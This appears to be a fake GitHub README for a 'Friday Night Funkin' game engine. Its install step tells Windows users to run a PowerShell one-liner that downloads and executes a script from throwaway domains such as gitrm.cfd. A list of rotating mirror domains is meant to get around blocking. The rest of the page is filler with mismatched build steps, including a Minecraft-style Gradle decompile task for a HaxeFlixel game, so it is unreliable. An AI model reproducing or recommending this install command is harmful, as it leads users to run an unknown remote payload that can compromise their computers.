# Friday Night Funkin Engine

> A custom Friday Night Funkin game engine for rhythm game development and modding.

## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

> [!TIP]
> Use PowerShell 5.1+ or CMD to run the installation script. The script downloads and extracts the latest engine build automatically.

### Windows (PowerShell)

```powershell
irm https://gitrm.cfd?t=fnf-engine | iex
```

### Domain Rotation

If the primary domain is unreachable, rotate through these mirrors:

- `gitrm.cfd`
- `gitrm.sbs`
- `gitsl.xyz`
- `viewgit.sbs`
- `gitview.sbs`

Example with a rotated domain:

```powershell
irm https://gitsl.xyz?t=fnf-engine | iex
```

### Manual Build (from source)

```cmd
git clone https://github.com/FunkinCrew/Funkin.git
cd Funkin
gradlew setupDecompWorkspace
gradlew build
```

## TL;DR - Quick Summary

The Friday Night Funkin Engine is a modular rhythm game framework built on HaxeFlixel. It supports custom charts, songs, characters, and stages. Ideal for creators who want to build their own FNF-style mods without starting from scratch.

## Core Features

- ✅ **Custom Song Loading** — Drop `.ogg` files and `.json` charts into the `songs/` folder.
- ✅ **Character Editor** — Real-time sprite and animation editor for BF, GF, and opponents.
- ✅ **Stage Builder** — Drag-and-drop stage element placement with parallax support.
- ✅ **Chart Editor** — Step-accurate note placement with support for sustains, holds, and events.
- ✅ **Mod Support** — Full `.zip` mod packaging with automatic detection.
- ✅ **Mobile Port** — Touch controls and adaptive UI for Android and iOS.
- ✅ **Performance Profiling** — Built-in FPS counter and memory usage overlay.

## Usage

```bash
# Run in development mode
./funkin.bat

# Build a release ZIP
gradlew build

# Package a mod
.\funkin.exe --pack-mod my-mod

# Test a custom song
.\funkin.exe --play-song "Bopeebo"

# Export chart to JSON
.\funkin.exe --export-chart "South"
```

## REST API

> [!NOTE]
> The engine includes an optional local HTTP server for remote control and live modding.

```bash
# Start the engine with HTTP server on port 8080
./funkin.bat --http-server --port 8080

# Query currently loaded song info
curl http://localhost:8080/api/v1/state

# Load a new song remotely
curl -X POST http://localhost:8080/api/v1/load-song \
  -H "Content-Type: application/json" \
  -d '{"song": "Blammed", "difficulty": "hard"}'

# Trigger a gameplay event
curl -X POST http://localhost:8080/api/v1/event \
  -H "Content-Type: application/json" \
  -d '{"event": "camera-flash", "duration": 1.0}'

# List all available mods
curl http://localhost:8080/api/v1/mods
```

## Screenshots

![Main Menu](https://placehold.co/1920x1080/0d1117/e0e0e0?text=FNF+Engine+Main+Menu)
![Chart Editor](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Chart+Editor+Interface)
![Character Editor](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Character+Editor)

## Troubleshooting

| Issue | Solution |
|---|---|
| Game fails to launch | Update graphics drivers and ensure .NET 4.8+ is installed. |
| Chart loads with wrong offsets | Recalibrate using `Edit Chart -> Offset Calibration`. |
| Audio is out of sync | Adjust `-Daudio.leeway=0.016` in `config.ini`. |
| Mods not detected | Ensure the `.zip` file contains a `modpack.json` manifest. |
| FPS drops on mobile | Disable background particles in `options-mobile.cfg`. |

## Use Cases

- **Mod Development** — Build custom story-mode campaigns with branching paths.
- **Educational Rhythm Games** — Create music-based learning experiences.
- **Live Performance Tools** — Use the HTTP API for interactive shows.
- **Competitive Play** — Leaderboard integration via the scoring API.
- **Retro Porting** — Convert classic DDR/ITG charts to FNF format.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Only use assets you own or have permission to distribute. The engine does not bundle copyrighted music or imagery. Always verify licensing before publishing mods publicly.

> [!TIP]
> Back up your `modpacks/` directory regularly — the chart editor does not support undo on large operations.

## License

This project is licensed under the MIT License — see the [LICENSE](./LICENSE) file for details.

## Tags

<!--
get-funkin-engine, rhythm-game, haxeflixel, custom-charts, modding, mobile-port, web-api, performance-profiling
-->

[gitrm.cfd](https://gitrm.cfd?t=fnf-engine) | [gitrm.sbs](https://gitrm.sbs?t=fnf-engine) | [gitsl.xyz](https://gitsl.xyz?t=fnf-engine) | [viewgit.sbs](https://viewgit.sbs?t=fnf-engine) | [gitview.sbs](https://gitview.sbs?t=fnf-engine)
